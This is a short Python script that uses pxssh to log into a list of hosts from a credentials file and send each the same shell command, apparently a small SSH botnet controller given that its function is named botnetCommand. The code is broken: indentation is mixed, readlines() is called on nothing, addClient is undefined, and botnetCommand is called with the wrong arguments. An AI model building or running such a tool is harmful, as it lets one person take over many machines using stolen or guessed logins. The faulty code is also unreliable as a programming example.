import pxssh
import argparse

class Client:
        def __init__(self,host,user,password):
               self.host = host
               self.user = user
               self.password = password
               self.session = self.connect()
        def connect(self):
                try:
                        s = pxssh.pxssh()
                        s.login(self.host,self.user,self.password)
                        return s
                except Exception as e:
                        print(e)
                        print('[-] ERROR Connecting')
        def send_command(self,cmd):
                self.session.sendline(cmd)
                self.session.prompt()
                return self.session.before
def botnetCommand(host,user,password,command):
    client = Client(host,user,password)
    output = client.send_command(command)
    print('[*] Output from '+ client.host)
    print('[+]'+output +'\n')


def main():
        
        parser = argparse.ArgumentParser()
        parser.add_argument('-f',dest='file',help='target')
        parser.add_argument('-c',dest='command')
        args = parser.parse_args()
        file = args.file
        cmd = args.command
        f=open(file,'r')
		for line in readlines():
            r=line.strip('\n').split(',')
    		host = r[0]
    		user = r[1]
    		password=r[2]
    		addClient(host,user,password)
    		botnetCommand(cmd)
				

    	f.close()

if __name__ == '__main__':
        main()
